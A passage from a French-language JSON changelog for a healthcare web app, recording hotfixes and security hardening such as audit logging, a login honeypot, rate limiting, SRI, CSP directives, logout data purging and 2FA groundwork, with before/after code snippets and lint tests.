    "noteFile": "NOTE-VERSION-Alpha-0.58.0.html",
    "sqlFile": null
  },
  {
    "v": "0.57.39",
    "kind": "version",
    "titre": "🚨 HOTFIX PROD : 'Lbl is not defined' sur /patient/[id]/edit + IconButton manquant dans maintenance + LINT anti-régression critique",
    "chantiers": [
      { "code": "FIX", "txt": "🚨 BUG CRITIQUE EN PROD signalé via stack trace browser : 'Uncaught ReferenceError: Lbl is not defined' sur 515-23b922f2ca00f063.js. Diagnostic : app/patient/[id]/edit/tabs/TabSecu.js importait uniquement { Field, FieldSelect, Toggle } depuis ./_helpers mais utilisait <Lbl> 2 fois dans le JSX. En dev ça passait peut-être (HMR), mais en build prod minifié → Lbl = undefined → crash. Cause des erreurs 400 Supabase qui suivaient : le crash React annulait les useEffect, les requêtes consentements_rgpd et interventions partaient avec patientId undefined" },
      { "code": "FIX", "txt": "FIX TabSecu.js : ajout de Lbl dans la liste d'imports → import { Lbl, Field, FieldSelect, Toggle } from './_helpers'. Build prod testé OK, plus de crash",
        "code_snippet": {
          "file": "app/patient/[id]/edit/tabs/TabSecu.js",
          "note": "Import manquant qui crashait toute la page patient",
          "lang": "jsx",
          "before": "// AVANT 0.57.39 - Lbl manquant\nimport { Field, FieldSelect, Toggle } from \"./_helpers\";\n//        ↑↑↑ Lbl manque ici !\n\nfunction TabSecu({ ... }) {\n  return (\n    <>\n      ...\n      <Lbl>Caisse d'affiliation</Lbl>    // ← crash en prod\n      ...\n      <Lbl>Organisme complémentaire</Lbl>  // ← crash en prod\n    </>\n  );\n}",
          "after": "// 0.57.39 - Lbl ajouté dans l'import\nimport { Lbl, Field, FieldSelect, Toggle } from \"./_helpers\";\n//          ↑↑↑ NEW : Lbl maintenant disponible\n\nfunction TabSecu({ ... }) {\n  return (\n    <>\n      ...\n      <Lbl>Caisse d'affiliation</Lbl>    // ← OK\n      ...\n      <Lbl>Organisme complémentaire</Lbl>  // ← OK\n    </>\n  );\n}"
        }
      },
      { "code": "FIX", "txt": "2e BUG TROUVÉ via audit complet : app/maintenance/page.js utilisait <IconButton> 3 fois mais ne l'importait pas. Fix : ajout dans la liste import { PageHead, Panel, StateMsg, Modal, Btn, IconButton } from '../ui'. Probablement pas encore crashé en prod mais aurait crashé dès qu'un user avec droits ecrire ouvrait la page maintenance" },
      { "code": "AI", "txt": "LINT ANTI-RÉGRESSION CRITIQUE 22e (le plus important !) : 'Aucun composant connu utilisé dans le JSX sans être importé ou défini localement'. Scan TOUTES les pages app/*.js + app/*/page.js + app/*/*/page.js. Pour chaque <X> dans le JSX où X est dans la whitelist UI_COMPONENTS (Modal/Btn/IconButton/PageHead/Panel/StateMsg/FilterBar/Pill/Spinner/Empty/ErrorBox) ou HELPER_COMPONENTS (Lbl/Field/FieldSelect/FieldCheckbox/Toggle/KvBlock), vérifie qu'il est importé OU défini localement (export function X, const X = ..., etc.). Reconnaît les 4 patterns d'import : (a) import X from, (b) import { A, B } from, (c) import X, { A, B } from, (d) export function/const/class X + export default function X. Si violation → fail le test → bloque le push. Garantit qu'aucun futur dev (humain ou IA) ne pourra introduire ce genre de bug",
        "code_snippet": {
          "file": "__tests__/v057-39-hotfix-lbl-iconbutton.test.js",
          "note": "LINT anti-régression qui aurait attrapé le bug 0.57.x",
          "lang": "js",
          "before": "// AVANT 0.57.39 - pas de check des imports JSX\n// → un import oublié dans Tab*, page.js, ou autre\n//   ne se voyait QU'EN PROD après build minifié\n// → debug très long (minified var names = Lbl, X, S...)",
          "after": "// 0.57.39 - LINT anti-régression critique\nconst UI_COMPONENTS = new Set([\n  \"PageHead\", \"Panel\", \"StateMsg\", \"Modal\", \"Btn\",\n  \"IconButton\", \"FilterBar\", \"Pill\", \"Spinner\",\n  \"Empty\", \"ErrorBox\",\n]);\nconst HELPER_COMPONENTS = new Set([\n  \"Lbl\", \"Field\", \"FieldSelect\", \"FieldCheckbox\",\n  \"Toggle\", \"KvBlock\",\n]);\n\nit(\"Aucun composant connu utilisé sans import\", () => {\n  for (const page of findPages()) {\n    const src = fs.readFileSync(page, \"utf-8\");\n\n    // 4 patterns d'import reconnus :\n    // (a) import X from\n    // (b) import { A, B } from\n    // (c) import X, { A, B } from\n    // (d) export (default) (function|const|class) X\n\n    const imported = collectImports(src);\n    const used = collectJsxUsage(src, ALL_KNOWN);\n\n    for (const comp of used) {\n      if (!imported.has(comp)) violations.push(...);\n    }\n  }\n  expect(violations).toEqual([]);\n});"
        }
      },
      { "code": "AI", "txt": "+8 tests Vitest (v057-39-hotfix-lbl-iconbutton.test.js) : version + SW (2), TabSecu fix Lbl (2), maintenance fix IconButton (2), LINT critique (1), pattern detection robustesse (1). Total 3261 verts (+8)" },
      { "code": "DOC", "txt": "RÉCAP : Erreur stack trace 'Lbl is not defined' = symptôme côté browser MINIFIÉ qui correspondait à TabSecu.js importait pas Lbl. Une fois ce crash fixé, les 2 erreurs 400 Supabase qui suivaient (consentements_rgpd + interventions) devraient aussi disparaître : elles venaient des useEffect qui partaient avec des paramètres undefined à cause du crash React partiel. À tester en prod après déploiement de 0.57.39" }
    ],
    "themes": ["hotfix", "import", "lint-critique"],
    "date": "3 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.39.html",
    "sqlFile": null
  },
  {
    "v": "0.57.38",
    "kind": "version",
    "titre": "🔧 Fix CORS Edge Functions + audit logs centralisé (security events) + honeypot anti-bot login + guide 2FA",
    "chantiers": [
      { "code": "FIX", "txt": "🚨 BUG SIGNALÉ : 'profil:1 Access to fetch at send-digest from origin aveho-ec-app.vercel.app has been blocked by CORS policy: No Access-Control-Allow-Origin header'. Diagnostic : le pattern regex strict ALLOWED_ORIGIN_PATTERNS (aveho-ec-app-[a-z0-9-]+-fleos-projects.vercel.app) ne matchait pas certains sous-domaines Vercel. Fix : pattern élargi à 'aveho-ec-app[a-z0-9-]*.vercel.app' qui matche maintenant : aveho-ec-app.vercel.app + tous les sous-domaines preview/branches. ⚠️ ACTION REQUISE : redéployer les 11 Edge Functions Supabase après ce fix pour que les changements prennent effet : supabase functions deploy <chaque-fonction>" },
      { "code": "SEC", "txt": "📊 SUJET 1/3 — AUDIT LOGS CENTRALISÉ. Création de lib/securityAudit.js (220 lignes) avec : (a) Whitelist fermée SEC_EVENT_TYPES (18 catégories : LOGIN_*, MFA_*, WEBAUTHN_*, ACCESS_DENIED, RGPD_EXPORT, BULK_EXPORT, ADMIN_ACTION, SUSPICIOUS_ACTIVITY, CSP_VIOLATION, HONEYPOT_TRIGGERED). (b) Helper logSecurityEvent() bas-niveau qui insère dans audit_log existante avec entite='security_event'. (c) 9 helpers prêts à l'emploi (auditLoginSuccess, auditLoginFailed, auditLoginBlocked, auditAccessDenied, auditMfaEnrolled/Unenrolled, auditHoneypotTriggered, auditBulkExport, auditAdminAction). (d) Enrichissement auto contexte browser (UA, locale, timestamp). (e) Try/catch pour ne JAMAIS bloquer le flow sécurité si audit échoue",
        "code_snippet": {
          "file": "lib/securityAudit.js + intégrations login + AdminGuard",
          "note": "Helper centralisé events sécurité",
          "lang": "js",
          "before": "// AVANT 0.57.38 - login sans audit centralisé\nconst { error } = await supabase.auth.signInWithPassword({ email, password: pwd });\nif (error) {\n  const result = recordFailedLogin(email);\n  // ↑ Compteur incrémenté, mais aucune trace audit_log\n  // → Impossible de détecter une attaque de bruteforce a posteriori\n  // → Pas de visibilité côté admin sur les patterns d'attaque\n  throw error;\n}",
          "after": "// 0.57.38 - audit log centralisé\nconst { error } = await supabase.auth.signInWithPassword({ email, password: pwd });\nif (error) {\n  const result = recordFailedLogin(email);\n\n  // ✅ Audit log centralisé via lib/securityAudit\n  const { auditLoginFailed, auditLoginBlocked } = await import(\"../../lib/securityAudit\");\n  if (result.blocked) {\n    await auditLoginBlocked(supabase, { userEmail: email }, {\n      reason: \"rate_limit_5_attempts\",\n      blocked_for_ms: result.remainingMs,\n    });\n  } else {\n    await auditLoginFailed(supabase, { userEmail: email }, {\n      error_code: error.code || null,\n      attempts_left: result.attemptsLeft,\n    });\n  }\n  throw error;\n}\n\n// ✅ Login success aussi loggé\nawait auditLoginSuccess(supabase, { userId, userEmail }, { method: \"password\" });"
        }
      },
      { "code": "SEC", "txt": "INTÉGRATIONS audit log (3 points d'entrée) : (a) app/login/page.js : auditLoginSuccess après login OK, auditLoginFailed sur error, auditLoginBlocked sur 5 échecs. (b) app/components/AdminGuard.js : useEffect qui logge auditAccessDenied avec path + role si user authentifié mais pas admin → permet d'analyser les patterns de tentatives d'élévation de privilèges. (c) Honeypot triggered : log auditHoneypotTriggered. Requête SQL pour voir tous les events sécurité : SELECT * FROM audit_log WHERE entite='security_event' ORDER BY created_at DESC" },
      { "code": "SEC", "txt": "🤖 SUJET 2/3 — HONEYPOT ANTI-BOT. Création de lib/honeypot.js (115 lignes). Stratégie : champ caché avec nom plausible (website_url, company_fax, etc.) + style display:none + tabIndex=-1 + autocomplete=off. Les bots automatisés naïfs remplissent TOUS les champs aveuglément → on les détecte instantanément. Exports : useHoneypot() hook React + getHoneypotHtml() pour HTML pur + detectBotFromBody() pour API routes serveur. Intégré dans app/login/page.js : si isBot() === true → log + délai 800-1200ms + erreur générique (anti-fingerprinting bot)",
        "code_snippet": {
          "file": "lib/honeypot.js + app/login/page.js",
          "note": "Champ caché anti-bot",
          "lang": "jsx",
          "before": "// AVANT 0.57.38 - aucun honeypot\n<form>\n  <input type=\"email\" value={email} ... />\n  <input type=\"password\" value={pwd} ... />\n  <button>Connexion</button>\n</form>\n// ↑ Un bot peut hammer la page de login sans aucune friction",
          "after": "// 0.57.38 - honeypot anti-bot\nimport { useHoneypot } from \"../../lib/honeypot\";\n\nconst { honeypotProps, isBot } = useHoneypot(\"website_url\");\n\nasync function submit() {\n  // ✅ Check AVANT le signIn\n  if (isBot()) {\n    // Log + délai aléatoire 800-1200ms + erreur générique\n    await auditHoneypotTriggered(supabase, ...);\n    await new Promise((r) => setTimeout(r, 800 + Math.random() * 400));\n    setErr(\"Erreur de validation. Réessaie.\");\n    return;\n  }\n  // ... flow normal\n}\n\n// Dans le JSX\n<form>\n  <input {...honeypotProps} />  {/* Invisible, mais bots le remplissent */}\n  <input type=\"email\" ... />\n  <input type=\"password\" ... />\n</form>"
        }
      },
      { "code": "DOC", "txt": "🔑 SUJET 3/3 — GUIDE-ACTIVATION-2FA.md créé (scripts/GUIDE-ACTIVATION-2FA.md, 130 lignes). 4 étapes détaillées : (1) Activer TOTP dans Dashboard Supabase → Authentication. (2) Intégrer <MfaSetup /> dans app/profil/page.js (3 lignes de code). (3) Activer checkMfaRequired() dans le flow login (12 lignes). (4) Tester. + Tableau de recommandations par profil utilisateur (admin OBLIGATOIRE, user accès patients OBLIGATOIRE, etc.). + Exemple SQL pour requêter les events MFA (audit_log entite=security_event action LIKE 'mfa_%'). + Help section debug" },
      { "code": "AI", "txt": "+35 tests Vitest (v057-38-audit-honeypot-cors.test.js) : version + SW (2), fix CORS pattern élargi (2), securityAudit structure (9 — exports SEC_EVENT_TYPES + 4 catégories + 9 helpers + whitelist + enrichissement + entite=security_event + try/catch), honeypot structure (6 — fields names + hook + style invisible + getHoneypotHtml + detectBotFromBody), intégration login honeypot (5 — import + JSX + ordre check + audit + délai), audit log login (3), AdminGuard audit (3), guide 2FA (4 — 4 étapes + URL Dashboard + recommandations + SQL exemple), LINT (1). Total 3253 verts (+35)" },
      { "code": "DOC", "txt": "BILAN SÉCURITÉ APRÈS 0.57.38 : (1) Bug CORS Edge Functions fixé (NEW). (2) Audit logs centralisé security events (NEW). (3) Honeypot anti-bot sur login (NEW). (4) Guide activation 2FA livré (NEW). (5) 21 LINT anti-régression critiques actifs. (6) Tests Vitest : 3253 verts. (7) Routes API + OCR + Storage + Edge Functions + pages admin + login + logout + biométrie + CRON + tous sécurisés. (8) Foundation 2FA TOTP prête (activable côté Supabase Dashboard + 3 lignes de code dans /profil)" }
    ],
    "themes": ["securite", "audit-logs", "anti-bot", "cors-fix"],
    "date": "3 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.38.html",
    "sqlFile": null
  },
  {
    "v": "0.57.37",
    "kind": "version",
    "titre": "🛡️ MEGA RELEASE SÉCURITÉ : security.txt + IndexedDB purge + CSP enrichie + SRI sur 3 scripts CDN + 2FA TOTP foundation + audit Referer (6 sujets)",
    "chantiers": [
      { "code": "SEC", "txt": "📨 SUJET 1 — security.txt RFC 9116 : création de public/.well-known/security.txt (contact securite@aveho.fr, expires 2027, languages fr/en, canonical URL) + public/.well-known/policy.html (politique complète : SLA accusé réception 72h, évaluation 14j, périmètre, pratiques interdites, mentions légales protection chercheurs bonne foi). Permet aux chercheurs en sécurité de signaler les vulnérabilités via le canal officiel" },
      { "code": "SEC", "txt": "🔐 SUJET 2 — clearUserData étendu pour Supabase tokens + IndexedDB WebAuthn. (a) SENSITIVE_LS_PREFIXES inclut maintenant 'sb-' → purge les clés sb-<projet>-auth-token (access_token + refresh_token). signOut() devrait les nettoyer mais defense-in-depth si signOut échoue partiellement. (b) Nouveau export clearWebauthnDb() qui supprime l'IndexedDB 'aveho-webauthn' (credentials face/empreinte). À utiliser UNIQUEMENT en mode 'logout complet' (option deepClean: true) car sinon l'user perd sa biométrie à chaque logout normal. (c) Signature clearUserData(options) avec options.deepClean booléen",
        "code_snippet": {
          "file": "lib/clearUserData.js",
          "note": "Extension purge avec IndexedDB",
          "lang": "js",
          "before": "// AVANT 0.57.37\nconst SENSITIVE_LS_PREFIXES = [\n  \"aveho:\", \"aveho_\", \"ville:\", \"etab-photo-\",\n];\n\nexport async function clearUserData() {\n  const ls_purged = purgeLocalStorage();\n  const sw_cleared = await clearSwCache();\n  return { ls_purged, sw_cleared };\n}",
          "after": "// 0.57.37 - sb-* + IndexedDB biométrie\nconst SENSITIVE_LS_PREFIXES = [\n  \"aveho:\", \"aveho_\", \"ville:\", \"etab-photo-\",\n  \"sb-\",  // ← NEW : Supabase Auth tokens defense-in-depth\n];\n\nexport async function clearWebauthnDb() {\n  // Supprime IndexedDB 'aveho-webauthn' (face/empreinte)\n  return new Promise((resolve) => {\n    const req = indexedDB.deleteDatabase(\"aveho-webauthn\");\n    req.onsuccess = () => resolve(true);\n    req.onerror = () => resolve(false);\n  });\n}\n\nexport async function clearUserData(options = {}) {\n  const ls_purged = purgeLocalStorage();\n  const sw_cleared = await clearSwCache();\n  // ⚠️ Purge bio UNIQUEMENT si deepClean explicite\n  const bio_cleared = options.deepClean === true\n    ? await clearWebauthnDb() : false;\n  return { ls_purged, sw_cleared, bio_cleared };\n}"
        }
      },
      { "code": "SEC", "txt": "🔗 SUJET 3 — Audit Referer leak + uniformisation rel='noopener noreferrer'. Référer-Policy 'strict-origin-when-cross-origin' déjà en place au niveau HTTP. Audit complet de TOUS les target='_blank' (15 fichiers) : 13/15 avaient déjà 'noopener noreferrer' ✅, 2/15 avaient juste 'noopener' (rpps-dump + mail-diagnostic). Uniformisation avec sed → 100% des liens externes ont maintenant 'noopener noreferrer' (defense-in-depth contre tabnabbing ET fuite Referer)" },
      { "code": "SEC", "txt": "🛡️ SUJET 4 — CSP enrichie avec 2 directives manquantes : (a) base-uri 'self' → empêche un attaquant XSS d'injecter une balise <base href='evil.com'> qui détournerait TOUS les liens relatifs de la page vers son serveur. (b) manifest-src 'self' → empêche le spoofing d'un manifest PWA malveillant. Garde le mode report-only par défaut (passage à enforce strict prévu après observation des CSP reports sur quelques semaines de prod)" },
      { "code": "SEC", "txt": "🔐 SUJET 5 — SRI (Subresource Integrity) sur les 3 scripts CDN externes : (a) jspdf@2.5.2 utilisé dans lib/consentPdf.js, app/statistiques-rgpd/page.js, app/statistiques-activite/page.js → sha384-en/ztfPSRkGfME4KIm05joYXynqzUgbsG5nMrj/xEFAHXkeZfO3yMK8QQ+mP7p1/. (b) qrcode-generator@1.4.4 utilisé dans lib/qrcode.js → sha384-lQXOAyZwHXE55JFyrOMB7nY2Wv+m5ZWNtJcHrd1rceRQXAYNLak8ukN5TjBTcIwz. Si jsdelivr est compromis ou si DNS hijacking, le browser refusera d'exécuter les scripts altérés (anti supply-chain attack). crossOrigin='anonymous' ajouté (requis pour SRI cross-origin)",
        "code_snippet": {
          "file": "lib/consentPdf.js + qrcode.js + 2 stats pages",
          "note": "SRI defense contre supply-chain CDN",
          "lang": "js",
          "before": "// AVANT 0.57.37 - script CDN sans intégrité vérifiée\nconst s = document.createElement(\"script\");\ns.src = \"https://cdn.jsdelivr.net/npm/jspdf@2.5.2/dist/jspdf.umd.min.js\";\ns.async = true;\n// ↑ Si jsdelivr compromise, script malveillant chargé\n//   dans le contexte authentifié de notre app",
          "after": "// 0.57.37 - SRI verification\nconst s = document.createElement(\"script\");\ns.src = \"https://cdn.jsdelivr.net/npm/jspdf@2.5.2/dist/jspdf.umd.min.js\";\ns.integrity = \"sha384-en/ztfPSRkGfME4KIm05joYXynqzUgbsG5nMrj/xEFAHXkeZfO3yMK8QQ+mP7p1/\";\ns.crossOrigin = \"anonymous\";  // requis pour SRI cross-origin\ns.async = true;\n// ↑ Browser vérifie le hash SHA-384. Si mismatch → refus + erreur\n//   La sandbox CSP empêche tout dommage."
        }
      },
      { "code": "SEC", "txt": "🔑 SUJET 6 — 2FA TOTP (Supabase Auth MFA) — foundation prête à activer. (a) lib/mfa.js (160 lignes) : 6 fonctions exportées (enrollTotp, verifyTotpEnrollment, listMfaFactors, checkMfaRequired, challengeAndVerifyTotp, unenrollMfaFactor) wrappant les APIs Supabase Auth MFA. Compatible Google Authenticator, Authy, 1Password, etc. (b) app/components/MfaSetup.js (composant React 3 états idle/verifying/active) : affiche QR code SVG, secret en backup manuel, input 6 chiffres avec validation, confirmation avant désactivation. (c) Helper checkMfaRequired() au login : si user a un factor TOTP vérifié + AAL pas encore aal2 → exiger le code TOTP. (d) À activer dans Dashboard Supabase → Auth → MFA → enable TOTP, puis intégrer <MfaSetup /> dans /profil et appeler checkMfaRequired() après signInWithPassword" },
      { "code": "AI", "txt": "2 LINT ANTI-RÉGRESSION CRITIQUES (20e + 21e LINT actifs) : (1) 'Aucun target=_blank sans noopener' — scan app/, vérifie 200 chars autour de chaque target=_blank pour matcher 'noopener'. Si un futur dev oublie le rel → fail. (2) 'Aucun script CDN externe sans SRI' — scan app/ + lib/ pour script.src = 'https://cdn|unpkg|cdnjs' chargeant un .js, vérifie qu'integrity est présent dans les 500 chars suivants. Si nouveau CDN ajouté sans SRI → fail" },
      { "code": "AI", "txt": "+28 tests Vitest (v057-37-six-sujets-securite.test.js) : version + SW (2), security.txt RFC 9116 (3), clearUserData IndexedDB (4 — sb prefix + clearWebauthnDb + deepClean + mode normal préserve bio), liens externes (1 LINT), CSP enrichie (3 — base-uri + manifest-src + reste report-only), SRI sur 3 fichiers (4) + LINT (1), 2FA TOTP (10 — mfa.js exports + Supabase API + validation 6 chiffres + aal2 + MfaSetup composant + 3 états + QR + maxLength + confirm). Total 3218 verts (+28)" },
      { "code": "DOC", "txt": "BILAN SÉCURITÉ APRÈS 0.57.37 : (1) security.txt + policy.html (NEW). (2) clearUserData étendu sb-* + IndexedDB biométrie en mode deepClean (NEW). (3) Tous target=_blank avec noopener noreferrer (NEW LINT). (4) CSP enrichie base-uri + manifest-src (NEW). (5) SRI sur 3 scripts CDN externes (NEW LINT). (6) 2FA TOTP foundation lib/mfa.js + composant MfaSetup (NEW). (7) 21 LINT anti-régression critiques actifs (vs 19 en 0.57.36). (8) Tests Vitest : 3218 verts. (9) Tous les bugs majeurs identifiés sont fixés. Reste à activer côté Supabase Dashboard : Authentication → MFA → TOTP" }
    ],
    "themes": ["securite", "mfa", "sri", "csp", "rfc-9116"],
    "date": "3 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.37.html",
    "sqlFile": null
  },
  {
    "v": "0.57.36",
    "kind": "version",
    "titre": "🔐 Rate-limit login côté client (anti-bruteforce) + check origin SW handler (defense-in-depth)",
    "chantiers": [
      { "code": "SEC", "txt": "🚨 AUDIT BRUTEFORCE LOGIN — page app/login/page.js. Supabase Auth a un rate-limit serveur (visible dans Dashboard Logs Auth) mais aucun rate-limit côté client. Conséquences : (a) Un attaquant peut hammer notre page de login avec credential stuffing (combos email/password) → consomme notre quota d'auth Supabase. (b) Pas de feedback UX : l'attaquant ne sait pas qu'il est rate-limited côté serveur. (c) Pas de protection contre l'automation naïve qui n'a pas de logique de retry. Risque : DoS sur le login + consommation quota + crédit Supabase facturé pour les tentatives échouées" },
      { "code": "SEC", "txt": "HELPER lib/loginRateLimit.js créé (145 lignes). Exporte 4 fonctions : (a) checkLoginBlock(email) — retourne { blocked, remainingMs, attempts } selon l'état actuel. (b) recordFailedLogin(email) — incrémente le compteur + bloque à 5 tentatives sur 5 minutes. (c) resetLoginAttempts(email) — efface après login réussi. (d) formatBlockTime(ms) — affichage human-readable (secondes/minutes). Email lowercased pour la clé (anti case-bypass). Storage key 'aveho:login-attempts' purgée au logout par le helper clearUserData de 0.57.35",
        "code_snippet": {
          "file": "lib/loginRateLimit.js",
          "note": "Helper anti-bruteforce côté client",
          "lang": "js",
          "before": "// AVANT 0.57.36 - login direct sans rate-limit\nasync function submit() {\n  const { error } = await supabase.auth.signInWithPassword({ email, password: pwd });\n  if (error) throw error;\n  // ↑↑↑\n  // L'attaquant peut hammer cette page :\n  // - 1000 tentatives × 100 emails × 100 passwords\n  // - Pas de feedback côté client\n  // - Consomme notre quota Supabase Auth\n}",
          "after": "// 0.57.36 - rate-limit côté client\nimport {\n  checkLoginBlock, recordFailedLogin,\n  resetLoginAttempts, formatBlockTime\n} from \"../../lib/loginRateLimit\";\n\nasync function submit() {\n  // ✅ Check AVANT de hit Supabase\n  const block = checkLoginBlock(email);\n  if (block.blocked) {\n    throw new Error(`Trop de tentatives. Réessaie dans ${formatBlockTime(block.remainingMs)}.`);\n  }\n\n  const { error } = await supabase.auth.signInWithPassword({ email, password: pwd });\n  if (error) {\n    // ✅ Incrémenter le compteur sur échec\n    const r = recordFailedLogin(email);\n    if (r.blocked) {\n      throw new Error(`Bloqué pour ${formatBlockTime(r.remainingMs)}.`);\n    }\n    // Affiche tentatives restantes (UX) si <= 2\n    if (r.attemptsLeft <= 2) {\n      throw new Error(`${error.message} (${r.attemptsLeft} restante${r.attemptsLeft > 1 ? 's' : ''})`);\n    }\n    throw error;\n  }\n\n  // ✅ Reset après login réussi\n  resetLoginAttempts(email);\n}"
        }
      },
      { "code": "SEC", "txt": "CONFIGURATION : 5 tentatives en 5 minutes par email → blocage 60 secondes. Reset après login réussi. Compteur par email lowercased (anti TEST@example.com vs test@example.com). Stockage localStorage clé 'aveho:login-attempts' (préfixe aveho: → purgée au logout par clearUserData de 0.57.35). Limites assumées : côté client uniquement (attaquant peut vider localStorage) — c'est une protection UX + anti-spam basique, le vrai rate-limit reste côté Supabase Auth. Protège contre bruteforce manuel/script naïf + credential stuffing automatisé basique + DoS sur notre page" },
      { "code": "SEC", "txt": "DEFENSE-IN-DEPTH SW : public/sw.js handler 'message' CLEAR_USER_CACHE vérifie maintenant event.source.url et compare avec self.location.href. Si origin différente → refuse + log warn. Risque exploitable réel quasi-nul (les SW ne reçoivent normalement que des messages same-origin par contrat browser), mais on rend la vérification explicite pour éviter qu'un futur changement d'API browser ne crée une faille subtle. try/catch sur new URL() pour fail-secure si parsing impossible",
        "code_snippet": {
          "file": "public/sw.js handler CLEAR_USER_CACHE",
          "note": "Check origin defense-in-depth",
          "lang": "js",
          "before": "self.addEventListener(\"message\", (event) => {\n  if (!event.data || event.data.type !== \"CLEAR_USER_CACHE\") return;\n  // ↑ aucun check origin\n  event.waitUntil(/* vide DATA + PAGE caches */);\n});",
          "after": "self.addEventListener(\"message\", (event) => {\n  if (!event.data || event.data.type !== \"CLEAR_USER_CACHE\") return;\n\n  // 0.57.36 : defense-in-depth — check origin\n  if (event.source && event.source.url) {\n    try {\n      const sourceUrl = new URL(event.source.url);\n      const myUrl = new URL(self.location.href);\n      if (sourceUrl.origin !== myUrl.origin) {\n        console.warn(\"[SW] Refus message origin différente\", sourceUrl.origin);\n        return;\n      }\n    } catch (e) {\n      return;  // fail-secure si parsing impossible\n    }\n  }\n\n  event.waitUntil(/* ... */);\n});"
        }
      },
      { "code": "AI", "txt": "LINT ANTI-RÉGRESSION CRITIQUE (19e LINT actif) : 'Toute page qui appelle signInWithPassword doit aussi avoir checkLoginBlock ou recordFailedLogin'. Scan tous les fichiers page.js sous app/, sauf whitelist inscription/[token]/ (login auto après accept invitation, pas un login normal). Si un futur dev ajoute un autre point d'entrée signInWithPassword sans rate-limit → fail" },
      { "code": "AI", "txt": "+21 tests Vitest (v057-36-login-ratelimit-sw-origin.test.js) : version + SW sync (2), loginRateLimit structure (4 — 4 exports + config + storage key + lowercase email), tests fonctionnels (8 — never seen + compte + bloque à 5 + check confirme + reset + case-insensitive + email invalide + format), intégration login page (4 — import + ordre check avant signIn + record + reset), SW check origin (2), LINT anti-régression (1). Total 3190 verts (+21)" },
      { "code": "DOC", "txt": "BILAN SÉCURITÉ APRÈS 0.57.36 : (1) Rate-limit login côté client : 5 tentatives / 5 min → blocage 60s (NEW). (2) SW handler check origin defense-in-depth (NEW). (3) 19 LINT anti-régression critiques actifs (vs 18 en 0.57.35). (4) Tests Vitest : 3190 verts. (5) Routes API protégées + validation + anti-leak (NEW : login). (6) 11 Edge Functions sécurisées + 9 pages admin AdminGuard. (7) Headers HTTP 10/10 + RLS 100%. (8) Cleanup logout localStorage + SW. (9) Toast realtime XSS protégé. (10) Tous les bugs majeurs identifiés sont fixés" }
    ],
    "themes": ["securite", "bruteforce", "rate-limit"],
    "date": "3 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.57.36.html",
    "sqlFile": null
  },
  {
    "v": "0.57.35",
    "kind": "version",
    "titre": "🧹 Cleanup données user au logout (device partagé) : localStorage + SW caches + LINT anti-PII",
    "chantiers": [
      { "code": "SEC", "txt": "🚨 AUDIT POST-LOGOUT — sur les devices PARTAGÉS (poste de soin, tablette commune), après le logout user A, l'user B suivant pouvait accéder à des traces persistantes : (a) localStorage 'aveho:search-history' contenait les patients recherchés (noms+prénoms+ID) via le Cmd+K. (b) localStorage 'aveho_dashboard' contenait la config des widgets de l'accueil (PII faible). (c) Caches Service Worker DATA_CACHE + PAGE_CACHE contenaient des réponses API et pages HTML mises en cache pour l'utilisation offline (PII forte : noms patients, codes INS, etc). (d) Cache photos établissement (lib/EtabPhoto.js). Le bug 0.57.29 avait identifié + commencé à fixer mais le code n'avait pas été déployé correctement. CVSS estimé : 5.5 MEDIUM (exploitation locale uniquement, device partagé)" },
      { "code": "SEC", "txt": "HELPER lib/clearUserData.js créé (105 lignes). Exporte 3 fonctions : (a) purgeLocalStorage() — itère localStorage, supprime toutes les clés qui matchent SENSITIVE_LS_PREFIXES (aveho:, aveho_, ville:, etab-photo-) sauf KEEP_KEYS whitelist (aveho:debug-logs flag debug volontaire). (b) clearSwCache() — envoie message CLEAR_USER_CACHE au SW via MessageChannel, attend la réponse avec timeout 2s. (c) clearUserData() — combo (purge + SW cleanup), retourne { ls_purged, sw_cleared } pour logs",
        "code_snippet": {
          "file": "lib/clearUserData.js",
          "note": "Helper de purge logout",
          "lang": "js",
          "before": "// AVANT 0.57.35 - logout minimal\nasync function logout() {\n  setOpen(false);\n  await supabase.auth.signOut();\n  router.push(\"/login\");\n}\n// ↑↑↑\n// signOut() vide UNIQUEMENT IndexedDB Supabase Auth (tokens)\n// → localStorage \"aveho:search-history\" reste\n// → SW DATA_CACHE / PAGE_CACHE restent\n// → User B sur même device : Cmd+K → voit les patients recherchés par user A",
          "after": "// 0.57.35 - logout sécurisé\nasync function logout() {\n  setOpen(false);\n  try {\n    const { clearUserData } = await import(\"../lib/clearUserData\");\n    await clearUserData();\n    // ↑↑↑ purge localStorage aveho:* + caches SW DATA + PAGES\n  } catch {\n    // Si erreur, on continue le logout malgré tout\n  }\n  await supabase.auth.signOut();\n  router.push(\"/login\");\n}"
        }
      },
      { "code": "SEC", "txt": "HANDLER public/sw.js : ajout d'un listener 'message' pour CLEAR_USER_CACHE. Vide DATA_CACHE et PAGE_CACHE en parallèle (Promise.all sur cache.delete pour chaque clé). NE vide PAS STATIC_CACHE (assets immutables comme /icon-192.png, /sw.js : partagés entre tous les users, conserver = perf). Reply via event.ports[0].postMessage avec stats { ok: true, deleted: { data: N, pages: N } }" },
      { "code": "SEC", "txt": "MODIF app/UserMenu.js : function logout() appelle await clearUserData() AVANT supabase.auth.signOut(). Import dynamique pour ne pas charger le helper au démarrage (only au logout). try/catch graceful : si purge échoue (quota, mode privé), on continue quand même le signOut (mieux vaut être déconnecté avec localStorage pollué que rester connecté)" },
      { "code": "AI", "txt": "LINT ANTI-RÉGRESSION CRITIQUE (18e LINT actif) : 'Toutes les clés localStorage commencent par un préfixe purgeable (aveho:, aveho_, ville:, etab-photo-)'. Scan tous les fichiers .js/.jsx sous app/ et lib/, trouve les localStorage.setItem(\"xxx\", ...), vérifie que la clé matche un préfixe purgeable (skip les variables dynamiques type cacheKey). Si un futur dev ajoute localStorage.setItem(\"patient-history\", ...) sans préfixe purgeable → le test fail (sinon cette clé survivrait au logout, fuite PII)" },
      { "code": "AI", "txt": "+19 tests Vitest (v057-35-clear-user-data-logout.test.js) : version + SW sync (2), clearUserData structure (6 — exports + SENSITIVE_LS_PREFIXES + KEEP_KEYS + MessageChannel + timeout 2s + combo), tests fonctionnels purgeLocalStorage (2 — purge sélective + fallback), SW handler CLEAR_USER_CACHE (5 — listener + DATA + PAGE + skip STATIC + reply MessageChannel), UserMenu logout (3 — import + ordre + try/catch), LINT anti-régression (1). Total 3169 verts (+19)" },
